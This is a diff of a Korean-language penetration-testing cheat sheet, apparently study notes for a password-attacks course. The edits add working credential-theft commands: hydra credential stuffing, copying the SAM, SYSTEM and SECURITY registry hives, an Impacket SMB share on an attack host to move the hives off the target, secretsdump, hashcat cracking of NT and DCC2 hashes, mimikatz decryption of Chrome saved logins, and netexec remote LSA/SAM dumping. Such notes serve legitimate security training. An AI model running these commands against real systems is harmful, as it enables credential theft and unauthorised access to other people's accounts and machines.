@@ -185,7 +185,7 @@ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/roc
 ```$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'```
 
 ### Credential Stuffing - Hydra
-```hydra -C <user_pass.list> <protocol>://<IP>```
+```$ hydra -C <user_pass.list> <protocol>://<IP>```
 
 ### Default Credentials
 ```
@@ -231,15 +231,19 @@ $ creds search linksys
 [Default Router Credentials](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)
 
 <br/><br/>
-# 5. Windows Local Password Attacks
+# 5. Extracting Passwords from Windows Systems
 
-## Attacking SAM
+## Attacking SAM, SYSTEM, and SECURITY
 #### reg.exe로 Registry Hives 복사
 ```
 reg.exe save hklm\sam C:\sam.save
 reg.exe save hklm\system C:\system.save
 reg.exe save hklm\security C:\security.save
 ```
+
+### Impacket's smbserver.py로 공유 생성
+- smb2support를 실행, 공유 이름(`CompData`), 저장할 공격 호스트의 디렉토리(`/home/ltnbob/Documents`) 지정<br/>
+```$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/```
 
 #### Impacket's secretsdump.py로 Dumping Hashes
 ```secretsdump.py -sam sam.save -security security.save -system system.save LOCAL```<br/>
@@ -248,9 +252,20 @@ secretsdump 출력 : (uid:rid:lmhash:nthash)
 #### Hashcat으로 Cracking Hashes (NT Hash)
 ```hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt```
 
+### DCC2 hashes
+- 네트워크 자격 증명 해시의 로컬 해시된 사본, PBKDF2를 사용하기 때문에 NT 해시보다 해독하기 어려움<br/>
+```$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt```
+
+### DPAPI
+- DPAPI 암호화된 자격 증명은 Impacket의 [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz)와 같은 도구를 사용<br/>
+```
+C:\Users\Public> mimikatz.exe
+mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
 ### Remote Dumping
-```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --lsa```<br/>
-```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --sam```<br/>
+```netexec smb 192.168.1.1 --local-auth -u <user> -p <password> --lsa```<br/>
+```netexec smb 192.168.1.1 --local-auth -u <user> -p <password> --sam```<br/>
 
 <br/><br/>
 ## Attacking Lsass
